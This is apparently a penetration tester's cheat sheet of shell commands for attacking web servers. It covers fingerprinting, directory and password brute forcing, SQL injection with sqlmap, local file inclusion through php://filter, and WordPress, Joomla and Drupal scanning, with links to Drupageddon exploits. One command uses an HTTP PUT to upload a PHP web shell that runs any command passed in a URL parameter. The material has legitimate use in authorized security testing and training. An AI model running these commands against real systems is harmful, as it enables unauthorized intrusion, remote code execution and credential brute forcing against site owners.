# basic commands
- check fingerprint
  ~~~sh
  cd /tmp/
  wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
  cd httprint_301/linux/
  ./httprint -h http://${HOST} -s signatures.txt
  ~~~

- Discovery dirs and files
  ~~~sh
  # nmap
  nmap -p80,443 --script http-enum -oA nmap-http-enum-${HOST} ${HOST}
  dirb http://${HOST}/

  # check Disallow dirs in robots.txt
  curl -s http://${HOST}/robots.txt | grep Disallow | sed 's/Disallow: //'
  for i in $(curl -s http://${HOST}/robots.txt | grep Disallow | sed 's/Disallow: //') ; \
  do RESULT=$(curl -s -I http://${HOST}"$i" | grep "200 OK") ; echo -e "$i $RESULT\r" ; done
  
  # brute force a dirs with custom wordlists
  nmap -p80 --script=http-brute --script-args 'http-brute.path=/printers/, userdb=/usr/share/wordlists/metasploit/http_default_users.txt, passdb=/usr/share/wordlists/rockyou.txt' ${HOST}
  nmap -p80 --script http-brute --script-args http-brute.path=/printers/ ${HOST}
  nmap --script -http-enum --script-args http-enum.basepath='pub/' ${HOST}
  ~~~

- check http headers / banners
  ~~~sh
  # mass
  nmap --script=http-headers 192.168.1.0/24
  nmap --script http-title -sV -p 80 192.168.1.0/24 
  
  # nc
  nc -nvv ${HOST} 80
    # Header
    HEAD / HTTP/1.0
  ~~~

- check methods and put to test
  ~~~sh
  DIR="test/"
  # check
  curl -v -X OPTIONS http://${HOST}/${DIR}
  # put
  curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://${HOST}/${DIR}
  ~~~

- vulnerability scanners
  ~~~sh
  nikto -C all -h http://${HOST}
  skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://${HOST}
  skipfish -o 202 http://${HOST}/wordpress
  ~~~

# PHP
~~~sh
http://${TARGET}/?page=upload   # original page
http://${TARGET}/?page=php://filter/convert.base64-encode/resource=upload
curl http://${TARGET}/?page=php://filter/convert.base64-encode/resource=upload
~~~

# SQL injection
~~~sh
sqlmap -u "http://${HOST}/?page=login" -a --level=5
sqlmap -r <request file> -a --level=5

hexorbase # GUI
~~~

# File including(LFI, RFI and RCE)
~~~sh
uniscan -u http://${HOST}:${PORT}/ -qweds
# Harvesting and testing
fimap -H -u "http://${HOST}" -d 3 -w /tmp/urllist
fimap -m -l /tmp/urllist
~~~

# CMS
- wordpress
~~~sh
wpscan ${TRGTDOMAIN}
wpscan --url http://${HOST} --enumerate u
wpscan --url http://${HOST}/secret --wordlist /usr/share/wordlists/dirb/big.txt --threads 2
~~~

- joomla
~~~sh
PORT="8081"
joomscan -u http://${HOST}:${PORT}}
~~~

- Drupal
  - Drupageddon
    - https://www.exploit-db.com/exploits/34984
    - https://www.exploit-db.com/exploits/34992
  - User enum
    - https://raw.githubusercontent.com/darkr4y/pentest-script/master/py/drupal_bruterforce.py
    - https://raw.githubusercontent.com/s0wr0b1ndef/OSCP-note/master/ENUMERATION/CMS/Drupal/drupal-finduser.sh

- Tools
  - https://github.com/FlorianHeigl/cms-explorer
